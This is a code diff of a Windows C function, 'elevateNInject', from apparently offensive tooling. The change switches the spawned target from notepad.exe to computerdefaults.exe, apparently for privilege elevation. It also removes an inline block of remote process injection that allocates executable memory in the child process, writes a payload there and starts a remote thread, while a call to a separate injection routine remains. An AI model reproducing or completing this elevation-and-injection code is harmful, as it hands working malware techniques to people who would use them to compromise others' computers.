@@ -287,7 +287,7 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 	}
 	si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
 	si.StartupInfo.wShowWindow = SW_SHOW;
-	wchar_t payload[] = L"C:\\Windows\\System32\\notepad.exe";
+	wchar_t payload[] = L"C:\\Windows\\System32\\computerdefaults.exe";
 	if (!CreateProcess(NULL,
 		payload,
 		NULL,
@@ -384,26 +384,10 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 	//	return FALSE;
 	//}
 	classicInject(pi.hProcess);
-	return TRUE;
-	HANDLE hProc = pi.hProcess;
+	//return TRUE;
+	//HANDLE hProc = pi.hProcess;
 	//classicInject(hProc);
 	//classicInject(hProc);
-
-	LPVOID pRemoteCode = NULL;
-	HANDLE hThread = NULL;
-	BOOL bStatus = FALSE;
-
-	pVirtualAllocEx = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "VirtualAllocEx");
-	pWriteProcessMemory = GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "WriteProcessMemory");
-	pRtlCreateUserThread = GetProcAddress(GetModuleHandle(L"Ntdll.dll"), "RtlCreateUserThread");
-
-	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
-	if (!pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL)) {
-		return FALSE;
-	}
-
-	bStatus = pRtlCreateUserThread(hProc, NULL, FALSE, 0, 0, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, &hThread, NULL);
-
 	/*
 	if (bStatus != FALSE) {
 		WaitForSingleObject(hThread, -1);
@@ -416,8 +400,8 @@ BOOL elevateNInject(_In_ HANDLE parentProc) {
 
 	//TerminateProcess(parentProc, 0);
 	//TerminateProcess(pi.hProcess, 0);
-	//CloseHandle(pi.hThread);
-	//CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+	CloseHandle(pi.hProcess);
 
 	//if (si.lpAttributeList)
 	//	DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
